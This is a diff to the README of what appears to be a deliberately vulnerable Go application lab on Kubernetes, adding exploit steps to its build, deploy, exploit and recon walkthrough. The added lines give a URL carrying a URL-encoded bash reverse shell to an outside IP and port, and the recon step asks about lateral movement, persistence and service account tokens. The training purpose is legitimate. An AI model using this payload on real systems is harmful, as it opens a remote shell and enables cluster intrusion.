@@ -44,7 +44,10 @@ cd go-rce-kubernetes && docker build .
 ```
 3. Deploy 
 4. Exploit 
- - The go-rce applicaion takes untrusted data from users as command line arguments and 
+ - The go-rce applicaion takes untrusted data from users as command line arguments and redirect
+ - Open a browser to the following link (Replace hostname and port with the external IP/port of the kubernetes service) <br>
+ [http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F10.11.11.39%2F8444%200%3E%261](http://hostname:port/google.com?bash%20-i%20%26%3E%20%2Fdev%2Ftcp%2F10.11.11.39%2F8444%200%3E%261)
+
 5. Recon
  - what information can you find that might be useful for lateral movement and/or persistence in the cluster? 
  - service account tokens? 
